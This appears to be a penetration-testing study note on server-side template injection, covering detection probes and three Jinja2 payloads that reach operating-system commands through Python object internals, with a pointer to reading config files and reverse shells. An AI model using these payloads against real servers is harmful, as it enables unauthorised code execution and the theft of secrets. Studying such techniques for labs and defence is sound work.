---
type: technique
tags: [ejpt:web-pentest]
tools: [curl]
cves: []
related: ["[[sql-injection]]", "[[prompt-injection]]", "[[reverse-shells]]", "[[source-code-disclosure]]"]
---

# Server-Side Template Injection (SSTI)

User input that reaches a server-side template engine and gets **evaluated** (not escaped) lets you run code in the template's language.

## Detection

- Identify the engine from the stack: `Gunicorn` → Python → **Jinja2** (`{{ }}`), `.ejs` → Node, `${ }` → FreeMarker/Thymeleaf.
- Submit an arithmetic probe and look for the *evaluated* result:
  - Jinja2/Python: `{{7*7}}` → `49`
  - FreeMarker: `${7*7}` → `49`
  - If the literal `{{7*7}}` is echoed back unchanged, it's only reflection — not injection.

## Jinja2 → RCE

Jinja2 blocks a direct `import os`, so you traverse the object graph to reach the OS:

1. Dump subclasses of `object` and hunt for `subprocess.Popen` or `os._wrap_close`:
   ```
   {{ ''.__class__.__mro__[1].__subclasses__() }}
   ```
2. Reference one by index to spawn a process:
   ```
   {{ ''.__class__.__mro__[1].__subclasses__()[N]('id', shell=True, stdout=-1).communicate() }}
   ```
3. **`__globals__` shortcut** — any function's `.__globals__` exposes its module's whole namespace. `flask.config.Config.__init__` lives in `flask.config`, which imports `os`:
   ```
   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```

## Why it matters

- Escalates straight to RCE as the web-server user, then pivots to [[source-code-disclosure]] (read `.env`/config files) or [[reverse-shells]].

## Seen in

[[pipepwned]] (`ref={{…}}` in the pipeline endpoint → RCE as `ciapp`)
